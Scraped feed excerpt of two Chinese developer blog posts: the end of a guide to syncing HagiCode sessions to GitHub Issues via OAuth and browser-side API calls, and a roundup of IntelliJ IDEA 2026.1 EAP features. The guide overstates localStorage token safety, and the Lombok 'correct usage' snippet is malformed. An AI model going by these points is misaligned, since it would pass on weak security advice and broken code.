left;\">需加密存储在数据库，有泄露风险</td>\n<td style=\"text-align: left;\">存储在浏览器，仅用户自己可见</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>实施成本</strong></td>\n<td style=\"text-align: left;\">需数据库迁移、多服务开发</td>\n<td style=\"text-align: left;\">主要是前端工作量</td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>用户体验</strong></td>\n<td style=\"text-align: left;\">逻辑统一，但服务器延迟可能稍高</td>\n<td style=\"text-align: left;\">响应极快，直接与 GitHub 交互</td>\n</tr>\n</tbody>\n</table>\n<p>考虑到我们要的是快速集成和最小化后端改动，<strong>最终我们采用了\"前端直连模式\"</strong>。这就像给浏览器发了一张\"临时通行证\"，拿到证之后，浏览器就可以自己去 GitHub 办事了，不需要每次都找后端管理员批准。</p>\n<hr />\n<h2 id=\"核心设计数据流与安全\">核心设计：数据流与安全</h2>\n<p>在确定架构后，我们需要设计具体的数据流。整个同步流程的核心在于如何安全地获取 Token 并高效地利用它。</p>\n<h3 id=\"整体架构图\">整体架构图</h3>\n<p>整个系统可以抽象为三个角色：浏览器（前端）、HagiCode 后端、GitHub。</p>\n<pre><code class=\"language-text\">+--------------+        +--------------+        +--------------+\n|  前端 React  |        |    后端      |        |    GitHub    |\n|              |        |   ASP.NET    |        |    REST API  |\n|  +--------+  |        |              |        |              |\n|  |  OAuth |--+--------&gt; /callback    |        |              |\n|  |  流程  |  |        |              |        |              |\n|  +--------+  |        |              |        |              |\n|              |        |              |        |              |\n|  +--------+  |        |  +--------+  |        |  +--------+  |\n|  |GitHub  |  +------------&gt;Session |  +----------&gt; Issues |  |\n|  |API     |  |        |  |Metadata|  |        |  |        |  |\n|  |直连    |  |        |  +--------+  |        |  +--------+  |\n|  +--------+  |        |              |        |              |\n+--------------+        +--------------+        +--------------+\n</code></pre>\n<p><strong>关键点在于</strong>：只有 OAuth 的一小步（获取 code 换 token）需要经过后端，之后的粗活累活（创建 Issue）都是前端直接跟 GitHub 打交道。</p>\n<h3 id=\"同步数据流详解\">同步数据流详解</h3>\n<p>当用户点击 HagiCode 界面上的\"Sync to GitHub\"按钮时，会发生一系列复杂的动作：</p>\n<pre><code class=\"language-text\">用户点击 \"Sync to GitHub\"\n         │\n         ▼\n1. 前端检查 localStorage 获取 GitHub Token\n         │\n         ▼\n2. 格式化 Issue 内容（将 Proposal 转换为 Markdown）\n         │\n         ▼\n3. 前端直接调用 GitHub API 创建/更新 Issue\n         │\n         ▼\n4. 调用 HagiCode 后端 API 更新 Session.metadata (存储 Issue URL 等信息)\n         │\n         ▼\n5. 后端通过 SignalR 广播 SessionUpdated 事件\n         │\n         ▼\n6. 前端接收事件，更新 UI 显示\"已同步\"状态\n</code></pre>\n<h3 id=\"安全设计\">安全设计</h3>\n<p>安全问题始终是集成第三方服务的重中之重。我们做了以下考量：</p>\n<ol>\n<li><strong>防 CSRF 攻击</strong>：在 OAuth 跳转时，生成随机的 <code>state</code> 参数并存入 sessionStorage。回调时严格验证 state，防止请求被伪造。</li>\n<li><strong>Token 存储隔离</strong>：Token 仅存储在浏览器的 <code>localStorage</code> 中，利用同源策略（Same-Origin Policy），只有 HagiCode 的脚本才能读取，避免了服务器端数据库泄露波及用户。</li>\n<li><strong>错误边界</strong>：针对 GitHub API 常见的错误（如 401 Token 过期、422 验证失败、429 速率限制），设计了专门的错误处理逻辑，给用户以友好的提示。</li>\n</ol>\n<hr />\n<h2 id=\"实践代码实现细节\">实践：代码实现细节</h2>\n<p>纸上得来终觉浅，咱们来看看具体的代码是怎么实现的。</p>\n<h3 id=\"1-后端最小化改动\">1. 后端最小化改动</h3>\n<p>后端只需要做两件事：存储同步信息、处理 OAuth 回调。</p>\n<p><strong>数据库变更</strong><br />\n我们只需要在 <code>Sessions</code> 表增加一个 <code>Metadata</code> 列，用来存储 JSON 格式的扩展信息。</p>\n<pre><code class=\"language-sql\">-- 添加 metadata 列到 Sessions 表\nALTER TABLE \"Sessions\" ADD COLUMN \"Metadata\" text NULL;\n</code></pre>\n<p><strong>实体与 DTO 定义</strong></p>\n<pre><code class=\"language-csharp\">// src/HagiCode.DomainServices.Contracts/Entities/Session.cs\npublic class Session : AuditedAggregateRoot&lt;SessionId&gt;\n{\n    // ... 其他属性 ...\n\n    /// &lt;summary&gt;\n    /// JSON metadata for storing extension data like GitHub integration\n    /// &lt;/summary&gt;\n    public string? Metadata { get; set; }\n}\n\n// DTO 定义，方便前端序列化\npublic class GitHubIssueMetadata\n{\n    public required string Owner { get; set; }\n    public required string Repo { get; set; }\n    public int IssueNumber { get; set; }\n    public required string IssueUrl { get; set; }\n    public DateTime SyncedAt { get; set; }\n    public string LastSyncStatus { get; set; } = \"success\";\n}\n\npublic class SessionMetadata\n{\n    public GitHubIssueMetadata? GitHubIssue { get; set; }\n}\n</code></pre>\n<h3 id=\"2-前端-oauth-流程\">2. 前端 OAuth 流程</h3>\n<p>这是连接的入口。我们使用标准的 Authorization Code Flow。</p>\n<pre><code class=\"language-typescript\">// src/HagiCode.Client/src/services/githubOAuth.ts\n\n// 生成授权 URL 并跳转\nexport async function generateAuthUrl(): Promise&lt;string&gt; {\n  const state = generateRandomString(); // 生成防 CSRF 的随机串\n  sessionStorage.setItem('hagicode_github_state', state);\n  \n  const params = new URLSearchParams({\n    client_id: clientId,\n    redirect_uri: window.location.origin + '/settings?tab=github&amp;oauth=callback',\n    scope: ['repo', 'public_repo'].join(' '),\n    state: state,\n  });\n  \n  return `https://github.com/login/oauth/authorize?${params.toString()}`;\n}\n\n// 在回调页面处理 Code 换取 Token\nexport async function exchangeCodeForToken(code: string, state: string): Promise&lt;GitHubToken&gt; {\n  // 1. 验证 State 防止 CSRF\n  const savedState = sessionStorage.getItem('hagicode_github_state');\n  if (state !== savedState) throw new Error('Invalid state parameter');\n\n  // 2. 调用后端 API 进行 Token 交换\n  // 注意：这里必须经过后端，因为需要 ClientSecret，不能暴露在前端\n  const response = await fetch('/api/GitHubOAuth/callback', {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ code, state, redirectUri: window.location.origin + '/settings?tab=github&amp;oauth=callback' }),\n  });\n\n  if (!response.ok) throw new Error('Failed to exchange token');\n  \n  const token = await response.json();\n  \n  // 3. 存入 LocalStorage\n  saveToken(token);\n  return token;\n}\n</code></pre>\n<h3 id=\"3-github-api-客户端封装\">3. GitHub API 客户端封装</h3>\n<p>有了 Token 之后，我们就需要一个强有力的工具来调 GitHub API。</p>\n<pre><code class=\"language-typescript\">// src/HagiCode.Client/src/services/githubApiClient.ts\n\nconst GITHUB_API_BASE = 'https://api.github.com';\n\n// 核心请求封装\nasync function githubApi&lt;T&gt;(endpoint: string, options: RequestInit = {}): Promise&lt;T&gt; {\n  const token = localStorage.getItem('gh_token');\n  if (!token) throw new Error('Not connected to GitHub');\n  \n  const response = await fetch(`${GITHUB_API_BASE}${endpoint}`, {\n    ...options,\n    headers: {\n      ...options.headers,\n      Authorization: `Bearer ${token}`,\n      Accept: 'application/vnd.github.v3+json', // 指定 API 版本\n    },\n  });\n  \n  // 错误处理逻辑\n  if (!response.ok) {\n    if (response.status === 401) throw new Error('GitHub Token 失效，请重新连接');\n    if (response.status === 403) throw new Error('无权访问该仓库或超出速率限制');\n    if (response.status === 422) throw new Error('Issue 验证失败，可能标题重复');\n    throw new Error(`GitHub API Error: ${response.statusText}`);\n  }\n  \n  return response.json();\n}\n\n// 创建 Issue\nexport async function createIssue(owner: string, repo: string, data: { title: string, body: string, labels: string[] }) {\n  return githubApi(`/repos/${owner}/${repo}/issues`, {\n    method: 'POST',\n    body: JSON.stringify(data),\n  });\n}\n</code></pre>\n<h3 id=\"4-内容格式化与同步\">4. 内容格式化与同步</h3>\n<p>最后一步，就是把 HagiCode 的 Session 数据转换成 GitHub Issue 的格式。这有点像\"翻译\"工作。</p>\n<pre><code class=\"language-typescript\">// 将 Session 对象转换为 Markdown 字符串\nfunction formatIssueForSession(session: Session): string {\n  let content = `# ${session.title}\\n\\n`;\n  content += `**&gt; HagiCode Session:** #${session.code}\\n`;\n  content += `**&gt; Status:** ${session.status}\\n\\n`;\n  content += `## Description\\n\\n${session.description || 'No description provided.'}\\n\\n`;\n  \n  // 如果是 Proposal 类型，添加额外字段\n  if (session.type === 'proposal') {\n    content += `## Chief Complaint\\n\\n${session.chiefComplaint || ''}\\n\\n`;\n    // 添加一个深链接，方便从 GitHub 跳回 HagiCode\n    content += `---\\n\\n**[View in HagiCode](hagicode://sessions/${session.id})**\\n`;\n  }\n  \n  return content;\n}\n\n// 点击同步按钮的主逻辑\nconst handleSync = async (session: Session) =&gt; {\n  try {\n    const repoInfo = parseRepositoryFromUrl(session.repoUrl); // 解析仓库 URL\n    if (!repoInfo) throw new Error('Invalid repository URL');\n\n    toast.loading('正在同步到 GitHub...');\n    \n    // 1. 格式化内容\n    const issueBody = formatIssueForSession(session);\n    \n    // 2. 调用 API\n    const issue = await githubApiClient.createIssue(repoInfo.owner, repoInfo.repo, {\n      title: `[HagiCode] ${session.title}`,\n      body: issueBody,\n      labels: ['hagicode', 'proposal', `status:${session.status}`],\n    });\n    \n    // 3. 更新 Session Metadata (保存 Issue 链接)\n    await SessionsService.patchApiSessionsSessionId(session.id, {\n      metadata: {\n        githubIssue: {\n          owner: repoInfo.owner,\n          repo: repoInfo.repo,\n          issueNumber: issue.number,\n          issueUrl: issue.html_url,\n          syncedAt: new Date().toISOString(),\n        }\n      }\n    });\n\n    toast.success('同步成功！');\n  } catch (err) {\n    console.error(err);\n    toast.error('同步失败，请检查 Token 或网络');\n  }\n};\n</code></pre>\n<hr />\n<h2 id=\"总结与展望\">总结与展望</h2>\n<p>通过这套\"前端直连\"方案，我们用最少的后端代码实现了 GitHub Issues 的无缝集成。</p>\n<h3 id=\"收获\">收获</h3>\n<ol>\n<li><strong>开发效率高</strong>：后端改动极小，主要是数据库加一个字段和一个简单的 OAuth 回调接口，大部分逻辑都在前端完成。</li>\n<li><strong>安全性好</strong>：Token 不经过服务器数据库，降低了泄露风险。</li>\n<li><strong>用户体验佳</strong>：直接从前端发起请求，响应速度快，不需要经过后端中转。</li>\n</ol>\n<h3 id=\"注意事项\">注意事项</h3>\n<p>在实际部署时，有几个坑大家要注意：</p>\n<ul>\n<li><strong>OAuth App 设置</strong>：记得在 GitHub OAuth App 设置里填正确的 <code>Authorization callback URL</code>（通常是 <code>http://localhost:3000/settings?tab=github&amp;oauth=callback</code>）。</li>\n<li><strong>速率限制</strong>：GitHub API 对未认证请求限制较严，但用 Token 后通常足够（5000次/小时）。</li>\n<li><strong>URL 解析</strong>：用户输入的 Repo URL 千奇百怪，记得正则要匹配 <code>.git</code> 后缀、SSH 格式等情况。</li>\n</ul>\n<h3 id=\"后续增强\">后续增强</h3>\n<p>目前的功能还是单向同步（HagiCode -&gt; GitHub）。未来我们计划通过 GitHub Webhooks 实现双向同步，比如在 GitHub 里关闭 Issue，HagiCode 这边的会话状态也能自动更新。这需要我们在后端暴露一个 Webhook 接收端点，这也是下一步要做的有趣工作。</p>\n<p>希望这篇文章能给你的第三方集成开发带来一点灵感！如果有问题，欢迎在 <a href=\"https://github.com/HagiCode-org/site\" rel=\"noopener nofollow\" target=\"_blank\">HagiCode GitHub</a> 上提 Issue 讨论。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-23 15:54</span>&nbsp;\n<a href=\"https://www.cnblogs.com/newbe36524\">Newbe36524</a>&nbsp;\n阅读(<span id=\"post_view_count\">62</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "IntelliJ IDEA 2026.1 EAP 发布！拥抱 Java 26，Spring Boot 4 深度支持！",
      "link": "https://www.cnblogs.com/javaguide/p/19522727",
      "published": "",
      "description": "<h2>\n            <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/javaguide/p/19522727\" id=\"cb_post_title_url\" title=\"发布于 2026-01-23 15:42\">\n    <span>IntelliJ IDEA 2026.1 EAP 发布！拥抱 Java 26，Spring Boot 4 深度支持！</span>\n    \n\n</a>\n\n        </h2>\n        <div class=\"postbody\">\n            <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>大家好，我是 Guide。这是真迅速啊！JetBrains 已经正式发布 <strong>IntelliJ IDEA 2026.1 EAP（Early Access Program）首个版本</strong>。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/1843652/202601/1843652-20260123154128712-980411710.png\" /></p>\n<p>作为一个面向下一代大版本的抢先体验版，这次 EAP 不仅带来了对最新 Java 语言特性的支持，还在 Spring、Gradle、Maven 等主流框架和构建工具上进行了深度优化，并修复了 <strong>600 多个</strong> 已知 Bug。</p>\n<p>在此之前，<a href=\"https://mp.weixin.qq.com/s/dfAGOXQAfdjQXonL3gmreg\" rel=\"noopener nofollow\" target=\"_blank\">IntelliJ IDEA 2025.3.x 系列</a>已经带来了不少改进。本次 2026.1 EAP 的发布，标志着 IDE 对下一代技术栈的全面拥抱。</p>\n<p>下面按模块拆解这次版本的几个关键变化。</p>\n<h2 id=\"一语言特性java-26-与模式匹配进化\">一、语言特性：Java 26 与模式匹配进化</h2>\n<h3 id=\"11-java-26-语言级别支持\">1.1 Java 26 语言级别支持</h3>\n<p>IDEA 2026.1 EAP 最引人注目的变化之一，就是<strong>新增 Java 26 语言级别</strong>支持。这意味着开发者可以提前体验和测试即将在 JDK 26 中正式发布的语言特性。</p>\n<p>其中最重要的变化是<strong>对 JEP 530 的全面支持</strong>——\"原始类型在模式、instanceof 和 switch 中的应用（第四预览版）\"。</p>\n<h3 id=\"12-原始类型模式匹配从包装类到原生类型的跨越\">1.2 原始类型模式匹配：从包装类到原生类型的跨越</h3>\n<p>JEP 530 是 Project Amber（专注于语言演进的 OpenJDK 项目）的重要组成部分。它的核心目标是：<strong>让模式匹配支持所有原始类型</strong>（primitive types），而不仅仅是包装类。</p>\n<p><strong>💡 这意味着什么？</strong></p>\n<p>在之前的 Java 版本中，模式匹配主要针对对象类型。当你想要对原始类型（如 <code>int</code>、<code>long</code>、<code>double</code>）进行模式匹配时，必须先进行自动装箱，这会带来额外的性能开销。</p>\n<p><strong>旧写法（受限）：</strong></p>\n<pre><code class=\"language-java\">// 只能用包装类做模式匹配\nif (obj instanceof Integer i) {\n    // 使用 i\n}\n</code></pre>\n<p><strong>新写法（JEP 530）：</strong></p>\n<pre><code class=\"language-java\">// 原始类型直接参与模式匹配\nObject obj = 42L;\nif (obj instanceof long l) {\n    // l 是原始 long，没有装箱开销\n    System.out.println(\"这是一个 long 值：\" + l);\n}\n</code></pre>\n<p>更强大的地方在于 <strong>switch 表达式的支持</strong>：</p>\n<pre><code class=\"language-java\">// 原始类型在 switch 中的模式匹配\nString formatNumber(Object obj) {\n    return switch (obj) {\n        case byte b -&gt; \"Byte: \" + b;\n        case short s -&gt; \"Short: \" + s;\n        case int i -&gt; \"Int: \" + i;\n        case long l -&gt; \"Long: \" + l;\n        case float f -&gt; \"Float: \" + f;\n        case double d -&gt; \"Double: \" + d;\n        default -&gt; \"Unknown type\";\n    };\n}\n</code></pre>\n<p><strong>核心价值：</strong></p>\n<ul>\n<li><strong>性能提升</strong>：减少自动装箱/拆箱的开销</li>\n<li><strong>代码简洁</strong>：不再需要手动拆箱处理</li>\n<li><strong>类型安全</strong>：编译时就能检查类型转换的合法性</li>\n</ul>\n<p>官方 JEP 文档：<strong><a href=\"https://openjdk.org/jeps/530\" rel=\"noopener nofollow\" target=\"_blank\">https://openjdk.org/jeps/530</a></strong></p>\n<h3 id=\"13-其他\">1.3 其他</h3>\n<ul>\n<li><strong>Bytecode Viewer 同步</strong>：字节码查看器现在支持与 Kotlin 文件的编辑器同步 ，并允许从非 Java 文件触发 “Show Bytecode” 。</li>\n<li><strong>Javadoc 增强</strong>：支持在内联 <code>{@return}</code> 标签中使用 <code>{@code}</code> 标签 。</li>\n<li><strong>注解折叠改进</strong>：提升了 Java 注解的折叠显示效果，并支持在内联的 <code>@return</code> 标签中使用 <code>{@code}</code> 。</li>\n</ul>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/1843652/202601/1843652-20260123154128572-175661814.png\" /></p>\n<h2 id=\"二spring-生态spring-boot-4-时代的全面适配\">二、Spring 生态：Spring Boot 4 时代的全面适配</h2>\n<p>Spring 开发者将迎来一次重大更新，特别是对 Spring Boot 4 的进一步深度适配。</p>\n<h3 id=\"21-spring-boot-4-深度支持\">2.1 Spring Boot 4 深度支持</h3>\n<p>Spring Boot 4.0 于 2025 年 11 月正式发布，基于 Spring Framework 7.0，全面支持 Java 25（含虚拟线程优化），是一个<strong>里程碑式的大版本更新</strong>。其核心变化包括：核心新特性包括：HTTP Service Clients 简化远程调用；原生 API 版本管理；全面采用 JSpecify 空安全体系（默认非空，编译期防 NPE）；关键依赖升级至 Jackson 3.0、Tomcat 11、Hibernate 7.1 等；支持 Gradle 9；Redis 静态主从配置；移除 Undertow。</p>\n<p>IDEA 2026.1 EAP 对 Spring Boot 4 的适配包括：</p>\n<ul>\n<li><strong>新增条件注解</strong>：支持 <code>@ConditionalOnEnabledHealthIndicator</code> 、<code>MailSenderCondition</code> 、<code>EmbeddedDatabaseCondition</code> 以及 <code>PooledDataSourceCondition</code> 。</li>\n<li><strong>配置类迁移适配</strong>：针对 Spring Boot 4 中移动的配置类（如 Caching 、Thymeleaf 、WebMvc 、FreeMarker 和 Mustache ）提供了全面的识别支持。</li>\n</ul>\n<h3 id=\"22-spring-data-jdbc-增强\">2.2 Spring Data JDBC 增强</h3>\n<p>数据库操作层面也有显著改进：</p>\n<ul>\n<li><strong>序列支持</strong>：新增对数据库序列（Sequences）的支持 ，并包含针对无名序列的检查项 。</li>\n<li><strong>Kotlin 协程支持</strong>：在 Spring Web 中支持 Coroutines 路由的 Kotlin DSL 。</li>\n<li><strong>嵌入式前缀</strong>：支持在结构中为嵌入对象（Embedded）添加前缀 。</li>\n</ul>\n<p><strong>💡 实际价值：</strong></p>\n<p>Spring Data JDBC 的这些改进，让开发者在处理复杂数据库映射时更加得心应手，特别是对于需要精细控制数据库序列的场景。</p>\n<h3 id=\"23-调试器spring-debugger稳定性提升\">2.3 调试器（Spring Debugger）稳定性提升</h3>\n<p>调试体验的稳定性提升是本次更新的另一个亮点：</p>\n<ul>\n<li><strong>事务节点修复</strong>：修复了在没有活动事务时事务节点依然残留的问题 。</li>\n<li><strong>远程调试增强</strong>：解决了通过 “Attach Debugger...” 链接连接远程进程时 Spring Debugger 不可用的问题 。</li>\n<li><strong>数据连接修复</strong>：修复了由于字符转义错误（'U'）导致 Spring Debugger 无法创建数据库连接的问题 。</li>\n</ul>\n<p><strong>实际影响：</strong></p>\n<p>对于需要频繁调试 Spring 应用的开发者来说，这些修复意味着调试过程的可预测性和稳定性大幅提升。</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/1843652/202601/1843652-20260123154128618-917342816.png\" /></p>\n<h2 id=\"三构建工具现代化gradle-9-与-maven-4\">三、构建工具现代化：Gradle 9 与 Maven 4</h2>\n<p>构建系统是项目的核心，IDEA 2026.1 EAP 对 Gradle 和 Maven 的最新版本提供了强力支持。</p>\n<h3 id=\"31-gradle-9-成为测试标准\">3.1 Gradle 9 成为测试标准</h3>\n<p>Gradle 9.3 于近期正式发布，是一个<strong>具有破坏性变化但性能显著提升</strong>的大版本。</p>\n<p><img alt=\"图片\" src=\"https://img2024.cnblogs.com/blog/1843652/202601/1843652-20260123154128597-1358730905.png\" /></p>\n<p><strong>IDEA 2026.1 EAP 的适配：</strong></p>\n<ul>\n<li>内部测试已全面切换到 <strong>Gradle 9.2.0</strong></li>\n<li>开始采用官方的 <strong>Gradle Tooling API (TAPI) 9.2.0</strong></li>\n<li>正式放弃对老旧的 <strong>Gradle 4.5</strong> 版本的支持</li>\n</ul>\n<h3 id=\"32-gradle-9-的关键变化\">3.2 Gradle 9 的关键变化</h3>\n<p>Gradle 9.0 带来了几个开发者必须关注的重大变化：</p>\n<h4 id=\"321-java-17-强制要求\">3.2.1 Java 17+ 强制要求</h4>\n<p><strong>破坏性变化：</strong></p>\n<ul>\n<li>Gradle 9.0 <strong>要求 JVM 17 或更高</strong>才能运行 Gradle Daemon</li>\n<li>大多数 Gradle API 现在编译为 JVM 17 字节码</li>\n<li>Gradle 仍支持编译 Java 6+ 的目标代码</li>\n</ul>\n<p><strong>💡 这意味着：</strong><br />\n如果你的项目还在使用 Java 8 或 Java 11，升级 Gradle 9 的第一步就是<strong>升级构建环境的 JDK 版本</strong>。</p>\n<h4 id=\"322-configuration-cache-优先模式\">3.2.2 Configuration Cache 优先模式</h4>\n<p>Gradle 9.0 最重要的性能特性是 <strong>Configuration Cache（配置缓存）成为首选执行模式</strong>。</p>\n<p><strong>核心特性：</strong></p>\n<ul>\n<li><strong>优雅降级</strong>：当插件或任务不支持配置缓存时，Gradle 会自动回退到非缓存模式，而不是构建失败</li>\n<li><strong>性能提升</strong>：在小模块变更场景下，报告显示有 <strong>~50% 的速度提升</strong></li>\n<li><strong>渐进式迁移</strong>：允许任务被明确标记为与配置缓存不兼容</li>\n</ul>\n<p><strong>示例对比：</strong></p>\n<pre><code class=\"language-gradle\">// Gradle 8：配置缓存是可选的\ntasks.named('compileJava').configure {\n    // 需要手动处理配置缓存兼容性\n}\n\n// Gradle 9：配置缓存优先，不兼容时自动降级\n// 构建会更快，且不会因缓存问题失败\n</code></pre>\n<h4 id=\"323-kotlin-dsl-体验升级\">3.2.3 Kotlin DSL 体验升级</h4>\n<p>在 <code>build.gradle.kts</code> 文件中，IDEA 现在支持：</p>\n<ul>\n<li><strong>直接运行配置按钮</strong>：可以通过 UI 按钮直接执行通过 <code>tasks.register { }</code> 注册的任务</li>\n<li><strong>更好的代码补全</strong>：Kotlin DSL 的编辑体验进一步优化</li>\n</ul>\n<p><strong>操作示例：</strong></p>\n<pre><code class=\"language-kotlin\">// build.gradle.kts\ntasks.register(\"myCustomTask\") {\n    doLast {\n        println(\"执行自定义任务\")\n    }\n}\n\n// IDEA 2026.1 EAP 中：\n// - 这个任务会自动出现在运行配置中\n// - 可以直接点击绿色按钮运行\n</code></pre>\n<h3 id=\"33-maven-4-集成\">3.3 Maven 4 集成</h3>\n<p>Maven 4 的适配也在同步推进：</p>\n<ul>\n<li><strong>内置版本更新</strong>：将内置 Maven 4 版本升级至 <strong>4.0.0-rc-5</strong> 。</li>\n<li><strong>同步优化</strong>：修复了 Maven 4.0.0 模型下不支持 <code>&lt;subprojects&gt;</code> 元素导致同步失败的问题 。</li>\n</ul>\n<p>Guide 想问问：<a href=\"https://mp.weixin.qq.com/s/WzeVZKm8DtmspKKX5RMzDQ\" rel=\"noopener nofollow\" target=\"_blank\">什么时候 Maven 4 正式版才能来啊？应该快了吧？</a></p>\n<blockquote>\n<p>Gradle 9 官方文档：<strong><a href=\"https://gradle.org/whats-new/gradle-9/\" rel=\"noopener nofollow\" target=\"_blank\">https://gradle.org/whats-new/gradle-9/</a></strong></p>\n</blockquote>\n<p><a href=\"https://javaguide.cn/zhuanlan/interview-guide.html\" rel=\"noopener nofollow\" target=\"_blank\">《SpringAI 智能面试平台+RAG 知识库》</a>配套实战项目教程正在更新，涉及到 Prompt Engineering、大模型集成、RAG（检索增强生成）、高性能对象存储与向量数据库。后续的话，还会同步上 Agent 项目。</p>\n<p>内容非常全面，非常适合想要实战 AI 项目或者准备 AI 大模型应用开发岗位面试的朋友，来一张刚写完的<strong>3.4w 字+35 道题目</strong>的 RAG 面试题总结，大家感受一下（点此链接了解）： <a href=\"https://javaguide.cn/about-the-author/zhishixingqiu-two-years.html\" rel=\"noopener nofollow\" target=\"_blank\">星球</a>）：</p>\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/1843652/202601/1843652-20260123154128762-1404565501.png\" /></p>\n<h2 id=\"四开发体验优化插件与框架改进\">四、开发体验优化：插件与框架改进</h2>\n<p>除了大型框架和构建工具的支持，IDEA 2026.1 EAP 在日常开发常用的插件和框架上也做了大量改进。</p>\n<h3 id=\"41-lombok-插件增强\">4.1 Lombok 插件增强</h3>\n<p>Lombok 是 Java 开发中最流行的代码生成插件之一，本次更新带来了：</p>\n<p><strong>新增支持：</strong></p>\n<ul>\n<li><strong><code>@Accessors(fluent = true)</code> 支持</strong>：链式调用风格的 getter/setter 生成</li>\n<li><strong>Builder 方法解析修复</strong>：解决特定情况下 Builder 方法无法正确解析的问题</li>\n</ul>\n<p><strong>⚠️ 新增检查：</strong></p>\n<ul>\n<li>插件现在会对<strong>在非静态内部类上使用 <code>@Slf4j</code> 的错误用法</strong>给出编译错误提示</li>\n</ul>\n<p><strong>实际影响：</strong></p>\n<pre><code class=\"language-java\">// 现在会被检测为错误用法\nclass Outer {\n    @Slf4j  // ❌ 编译错误：非静态内部类不能使用 @Slf4j\n    class Inner {\n        // ...\n    }\n}\n\n// 正确用法\nclass Outer {\n    static class Inner {\n        @Slf4j  // ✅ 静态内部类可以使用\n        // ...\n    }\n}\n</code></pre>\n<h3 id=\"42-框架与语言支持\">4.2 框架与语言支持</h3>\n<ul>\n<li><strong>Hibernate 修复</strong>：解决了 Hibernate 插件错误地要求 Spring 插件作为先决条件的回归问题 。</li>\n<li><strong>Groovy 5 支持</strong>：修复了在 Groovy 5 项目中将接口静态方法误报为错误的问题 。</li>\n<li><strong>JPA QL 语法</strong>：修复了大量 JPA QL/HQL 的语法高亮错误，包括对 <code>RIGHT JOIN</code> 和 <code>coalesce</code> 子查询 的支持。</li>\n</ul>\n<h3 id=\"43-javadoc-转换为-markdown\">4.3 Javadoc 转换为 Markdown</h3>\n<p>IDE 进一步优化了 “Convert to Markdown documentation comment” 功能，修复了转换时吞掉链接换行符 以及列表缩进错误 的问题。</p>\n<h2 id=\"五性能与稳定性600-bug-修复\">五、性能与稳定性：600+ Bug 修复</h2>\n<p>除了新功能，本次 EAP 还包含了大量的 Bug 修复和性能优化，涵盖了从核心平台、UI、文件系统到各种语言的方方面面。</p>\n<h3 id=\"51-核心平台优化\">5.1 核心平台优化</h3>\n<p><strong>修复的问题：</strong></p>\n<ul>\n<li><strong>WSL 环境下 Tomcat 调试</strong>：解决了在 WSL（Windows Subsystem for Linux）环境下 Tomcat 调试不工作的问题</li>\n<li><strong>远程开发冻结</strong>：修复了远程开发中的一些冻结问题</li>\n</ul>\n<h3 id=\"52-ui-体验改进\">5.2 UI 体验改进</h3>\n<p><strong>优化项：</strong></p>\n<ul>\n<li><strong>编辑器优化</strong>：编辑器响应速度和流畅度提升</li>\n<li><strong>终端改进</strong>：终端体验问题修复</li>\n<li><strong>搜索体验</strong>：搜索功能的性能和准确性提升</li>\n</ul>\n<h3 id=\"53-语言支持全面增强\">5.3 语言支持全面增强</h3>\n<p><strong>覆盖语言：</strong></p>\n<ul>\n<li><strong>Kotlin</strong>：IDEA 对 Kotlin 语言的支持持续优化</li>\n<li><strong>Groovy</strong>：Groovy 脚本编辑体验改进</li>\n<li><strong>JavaScript/TypeScript</strong>：前端开发支持增强</li>\n</ul>\n<h2 id=\"六总结是否值得升级\">六、总结：是否值得升级？</h2>\n<p>下面是 <strong>IntelliJ IDEA 2026.1 EAP 1</strong> 带来的关键升级：</p>\n<h3 id=\"61-关键升级一览表\">6.1 关键升级一览表</h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>说明</th>\n<th>适用人群</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Java 26 支持</strong></td>\n<td>JEP 530 原始类型模式匹配（第四预览）</td>\n<td>喜欢尝鲜的开发者</td>\n</tr>\n<tr>\n<td><strong>Spring Boot 4</strong></td>\n<td>深度适配新条件注解和配置类</td>\n<td>Spring 开发者</td>\n</tr>\n<tr>\n<td><strong>Gradle 9</strong></td>\n<td>配置缓存优先、Java 17+ 要求</td>\n<td>构建性能敏感者</td>\n</tr>\n<tr>\n<td><strong>Maven 4</strong></td>\n<td>内置版本更新至 4.0.0-rc-5</td>\n<td>Maven 用户</td>\n</tr>\n<tr>\n<td><strong>Lombok 增强</strong></td>\n<td>@Accessors(fluent=true) 支持</td>\n<td>Lombok 用户</td>\n</tr>\n<tr>\n<td><strong>600+ Bug 修复</strong></td>\n<td>核心平台、UI、多语言支持</td>\n<td>所有用户</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"62-升级建议\">6.2 升级建议</h3>\n<p>如果你正在考虑向 <strong>Spring Boot 4</strong> 迁移，或者需要使用 <strong>Java 26</strong> 的预览特性，这个 EAP 版本非常值得尝试。但请注意，由于这是 EAP 1 版本，建议仅在非生产环境中使用，并定期备份你的配置文件。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li>Release Notes： <strong><a href=\"https://youtrack.jetbrains.com/articles/IDEA-A-2100662609/IntelliJ-IDEA-2026-1-EAP-1-261-17801.55-build-Release-Notes\" rel=\"noopener nofollow\" target=\"_blank\">https://youtrack.jetbrains.com/articles/IDEA-A-2100662609/IntelliJ-IDEA-2026-1-EAP-1-261-17801.55-build-Release-Notes</a></strong></li>\n<li>What's new in Gradle 9.0.0：<strong><a href=\"https://gradle.org/whats-new/gradle-9\" rel=\"noopener nofollow\" target=\"_blank\">https://gradle.org/whats-new/gradle-9</a></strong></li>\n</ul>\n\n</div>\n<div class=\"clear\"></div>\n\n        </div>\n        <p class=\"postfoot\">\n            posted on \n<span id=\"post-date\">2026-01-23 15:42</span>&nbsp;\n<a 